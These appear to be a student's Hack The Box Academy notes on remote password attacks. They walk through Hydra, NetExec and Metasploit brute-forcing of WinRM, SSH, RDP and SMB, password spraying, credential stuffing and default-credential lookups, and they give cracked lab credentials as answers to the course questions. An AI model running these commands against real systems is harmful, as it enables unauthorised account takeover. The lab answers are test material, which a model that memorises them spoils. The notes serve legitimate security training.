# Remote Password Attacks



## Network Services

During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`.

For further reading on many of these services, check out the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) module on HTB Academy.

Let us imagine that we want to manage a Windows server over the network. Accordingly, we need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal. In this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`. SSH is not as common on Windows, but it is the leading service for Linux-based systems.

***

## WinRM - NetExec

As an example, this is what attacking a WinRM endpoint might look like:

```shell-session
eldeim@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.**Evil-WinRM Usage**

```shell-session
eldeim@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

### **Evil-WinRM Usage**

```shell-session
eldeim@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

## **Hydra - SSH**

We can use a tool like `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

```shell-session
eldeim@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.

```shell-session
eldeim@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
```

## **Hydra - RDP**

We can also use `Hydra` to perform RDP bruteforcing.

```shell-session
eldeim@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

Linux offers different clients to communicate with the desired server using the RDP protocol. These include [Remmina](https://remmina.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp), and many others. For our purposes, we will work with xfreerdp.

### **xFreeRDP**

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

&#x20; Network Services

```shell-session
eldeim@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

<SNIP>

New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

## **Hydra - SMB**

```shell-session
eldeim@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

However, we may also get the following error describing that the server has sent an invalid reply.

## **Hydra - Error**

```shell-session
eldeim@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

### **Metasploit Framework**

```shell-session
eldeim@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now we can use `NetExec` again to view the available shares and what privileges we have for them.

## **NetExec**

```shell-session
eldeim@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

## **Smbclient**

```shell-session
eldeim@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

***

### Lab - Questions

> To complete the challenge questions, be sure to download the wordlists from the attached network-services.zip archive. `It is highly recommended to run your attacks from the Pwnbox` as some of the tasks take much longer over the VPN

{% embed url="https://academy.hackthebox.com/storage/modules/147/network-services.zip" %}

* Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
nxc winrm 10.129.202.136 -u username.list -p password.list 

WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\adc:princess
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\accountspayable:princess
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\:princess
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)

```

```
evil-winrm -i 10.129.202.136 -u john -p november
```

***

* Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
nxc ssh 10.129.202.136        
                           
SSH         10.129.202.136  22     10.129.202.136   [*] SSH-2.0-OpenSSH_for_Windows_7.7
```

```
hydra -L username.list -P password.list ssh://10.129.202.136 -I -t 10
[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar
```

***

* Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
nxc rdp 10.129.202.136
RDP         10.129.202.136  3389   WINSRV           [*] Windows 10 or Windows Server 2016 Build 17763 (name:WINSRV) (domain:WINSRV) (nla:True)
```

```
hydra -L username.list -P password.list rdp://10.129.202.136 -I -t 4
[3389][rdp] host: 10.129.202.136   login: chris   password: 789456123
```

```
xfreerdp /v:10.129.202.136 /u:chris /p:789456123
```

***

* Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```
nxc smb 10.129.202.136
SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\dennis:rockstar
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910
```

```
nxc smb 10.129.202.136 -u username.list -p password.list
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\john:november 

└──╼ [★]$ nxc smb 10.129.202.136 -u cassie -p 12345678910 --shares
SMB         10.129.202.136  445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.202.136  445    WINSRV           [*] Enumerated shares
SMB         10.129.202.136  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.136  445    WINSRV           -----           -----------     ------
SMB         10.129.202.136  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.136  445    WINSRV           C$                              Default share
SMB         10.129.202.136  445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.202.136  445    WINSRV           IPC$            READ            Remote IPC

```

```
smbclient -U cassie \\\\10.129.202.136\\CASSIE
```

***

***

## Spraying, Stuffing, and Defaults

### Password spraying

[Password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use `ChangeMe123!` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.

Depending on the target system, different tools may be used to carry out password spraying attacks. For web applications, [Burp Suite](https://portswigger.net/burp) is a strong option, while for Active Directory environments, tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) or [Kerbrute](https://github.com/ropnop/kerbrute) are commonly used.

```shell-session
eldeim@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

### Credential stuffing

[Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms (such as email, social media, and enterprise systems), these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system. For example, if we have a list of `username:password` credentials obtained from a database leak, we can use `hydra` to perform a credential stuffing attack against an SSH service using the following syntax:

```shell-session
eldeim@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```

### Default credentials

Many systems—such as routers, firewalls, and databases—come with `default credentials`. While best practice dictates that administrators change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which we can install with `pip3`.

```shell-session
eldeim@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```

Once installed, we can use the `creds` command to search for known default credentials associated with a specific product or vendor.

```shell-session
eldeim@htb[/htb]$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```

| **Router Brand** | **Default IP Address** | **Default Username** | **Default Password** |
| ---------------- | ---------------------- | -------------------- | -------------------- |
| 3Com             | http://192.168.1.1     | admin                | Admin                |
| Belkin           | http://192.168.2.1     | admin                | admin                |
| BenQ             | http://192.168.1.1     | admin                | Admin                |
| D-Link           | http://192.168.0.1     | admin                | Admin                |
| Digicom          | http://192.168.1.254   | admin                | Michelangelo         |
| Linksys          | http://192.168.1.1     | admin                | Admin                |
| Netgear          | http://192.168.0.1     | admin                | password             |

***

### Lab - Questions

* Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer

> user "sam" and password "B@tm@n2022!"

Firstly, connect to machine via ssh and then try tod login in mysql server

So I used **defaultcreds-cheat-sheet**:

```
creds search MySQL+---------------------+-------------------+----------+| Product             |      username     | password |+---------------------+-------------------+----------+| mysql (ssh)         |        root       |   root   || mysql               | admin@example.com |  admin   || mysql               |        root       | <blank>  || mysql               |      superdba     |  admin   || scrutinizer (mysql) |    scrutremote    |  admin   |+---------------------+-------------------+----------+
```

And got the creds `superdba:admin`.
